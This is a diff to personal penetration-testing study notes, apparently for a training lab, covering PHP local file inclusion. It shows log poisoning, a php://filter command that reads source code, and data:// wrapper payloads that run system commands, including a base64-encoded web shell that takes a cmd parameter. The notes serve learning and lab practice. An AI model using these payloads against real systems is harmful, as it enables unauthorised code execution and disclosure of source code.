@@ -64,4 +64,52 @@ grafana example
 note : bak.php are backup files and are human readable
 how the exploit works is the page is generate using index.php which has a line that checks for what page is being loaded. This can be directly edited to gain access to unintended directories leading to path traversal.
 
-The user agent is part of the access.log file which allow for rce via code injection and lfi by using a get request to run the code loaded as a param of the path
+The user agent is part of the access.log file which allow for rce via code injection and lfi by using a get request to run the code loaded as a param of the path. The poisoned log will be ran as a **php file** rather than a tag. See the <\?php ?> bracket and run the poisoned line.
+
+host header allows for multiple website to be hosted on one ip through vhost. If you want a website to resolve you need to enter both a valid host header and ip.
+
+host name includes entire url excluding dir and php header
+http://google.com/index.php
+hostname=google.com
+### PHP wrapper
+#### Stream wrapper
+- apply methods to a data stream before displaying
+- a meta wrapper to be included in php wrappers
+##### php://filter
+display the content of the files to scan for sensitive information that is encoded in rot13 or base64
+example
+- `curl http://mountaindesserts.local/meteor/index.php?page=php://filter/resource=admin.php` shows a cut off page with sensitive portion encoded
+- use `curl http://mountaindesserts.local/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php` to display encoded portoin
+	- php://filter - meta wrapper
+	- convert.base64.encode - run 'encode' method from type b64 in the lib convert
+	- /resource - target to apply to
+##### data://wrappers
+- code execution
+After URL-decoding, PHP's `$_GET['page']` holds the literal string you passed, so the vulnerable line:
+
+```php
+include($_GET['page']);
+```
+
+effectively becomes:
+
+```php
+include("data://text/plain,<?php echo system('ls');?>");
+```
+
+PHP's `data://` stream wrapper then resolves that URI and hands `include()` the part after the comma as the "file contents" — functionally identical to this:
+
+```php
+include("payload.php");   // where payload.php contains only:
+<?php echo system('ls');?>
+```
+
+Same execution result, except there's no `payload.php` anywhere on disk — the wrapper fabricates the stream in memory from the URL itself. The rest of `index.php`'s code around that `include()` line runs exactly as it always does; the wrapper only ever substitutes what the `include()` call resolves to.
+- example
+	- `curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`
+		- inject a small snipplet into the web application (index.php) code
+	- `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
+		- bypass firewall filtering by encoding to base64 first
+	- `curl "http://mountaindesserts.local/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
+		- encoded portion - setter
+		- &cmd=ls - payload
